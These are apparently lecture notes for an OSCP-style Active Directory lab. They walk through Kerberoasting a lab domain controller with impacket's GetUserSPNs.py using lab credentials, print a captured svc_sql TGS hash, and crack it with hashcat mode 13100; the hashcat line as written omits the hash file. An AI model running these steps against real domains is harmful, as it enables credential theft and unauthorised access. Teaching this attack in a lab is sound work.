#+TITLE: OSCP 10 - Active Directory
#+AUTHOR: Leonardo Tamiano

Start vmware with ~DC01~.

#+begin_src sh
python3 -m venv venv
pip3 install impacket
#+end_src

We can connect with credentials

#+begin_example
ripley:password
#+end_example

Maybe show login with RDP?

--------------

Perform ~kerberoasting~ account to see all hashes that we can get

#+begin_example
GetUserSPNs.py -dc-ip 172.16.250.141 oscp.lab/ripley
#+end_example

actually get the hash
  
#+begin_example
GetUserSPNs.py -request -dc-ip 172.16.250.141 oscp.lab/ripley
#+end_example

We got the following hash

#+begin_example
$krb5tgs$23$*svc_sql$OSCP.LAB$oscp.lab/svc_sql*$acf96f08f9b9efe5ecc8c9071f080d80$a14512c380d22cd4c24895f9589a7032c790041a751a067d8c8d5d2b947d1b373ffb8168feb264a1007b22f3868e2b02675e58c8a2488d91f4a279aea2414519b8875ca10c57bf8166700f02423a12b74f085d7595271db98dbf43f68fa496620260c2d85832a33c2f34633f84a63a93fd14c2b7cef17a64134ba067a5f22266c91ef1ca5fa053d92b4e9f549b0ff9baad4496852cdd27b40d886830a3978509278dc3bdb0200274c19543ba4e2d966c914953074252aa4b19002022f49abe63872196477d31d59d669077f735390da5fea6ccb225e83371b4225a4014330b3fb08fed35d238b9f01922a6f3038bef954ea00d3485239ea10df9184a4284dff8fb886fffe6fd1397055345415dff9dcb621d0c5af8bf7555ea7c65e449e0c6117f98892de1a45d4cf79e285535b806bcfe0ab1f0405d18af281ee9bebfdc220ba796155a194f46f0ad641f88476c710adde1a15fd55272700f9eaed39a3df7ce3358bc0843a587307a056d038e01ac0cabfbd15ba45a0a12c8d086c58b477cfceba108b3629f8b13a063eee223882f905c24318408b2eb2e6c59339aa4487c50b4a89815e01a02f9106a38d0497d1a3e929530797c446f548077f5c0607a40e727c46be6b9c1309e0f69f19744e8b89940305e366f46c92515348d0224a3e221c0cc3592540635ec7749c2fb269330c62599a668887304702b7054ecb425fecbd765cb20fb82f492172f77791bf617f9fe6a58a2c9cf8081ad3b36f546d6d030fde50d9ad5421bc7917be8865292ae42194d78d1d3f5b06d439cbd0e5e5e2779ac0b47f70a200f1e4ca6df64213029157ed90c9914be452d9230376bd567f5fae21cc5cc3ad55efc282f2ec0b25b54facbac791dfeb454fbaa2ae3c445006ad79671b1f8682470dd57b6ab1bc743ed0b08214c851d8efcb7a36e3903a94b08dc341cb1cc8da3d945c3fd5f78716663faba2319a96750693bbd922d40d87a0d9c283f7add64ce195c6d1bd1840921c560f4ed4f2ecc5950d694cb375741d3621cf9f034aab7fb8d0aad88a15174f0efbac17d6659b54b2f940c2bd300bf091c3e01836f95729d3fb0e34dfc5c54f598d709d3e00e2a98d18d14e1df9f6b5bbeb6b5e4d55c05c63edcb1725e42f8f050219afb59b8dd7d3d318e93f9fa05998b0907c1298eebe96c2f2b2e3a2bbe6913417de116a1c43259284aa1008ee1c2c02a7c82928e449b7e7b1d6073a75cbf8106c28fa2139b5e209972575a837d82d0c4d8b40ad8f2b6ab
#+end_example

crack it with hashcat with code ~13100~, which stands for ~Kerberos 5 TGS-REP~

TGS -> Ticket Granting Service  
  
#+begin_example
sudo hashcat -m 13100 rockyou.txt --force
#+end_example

profit!
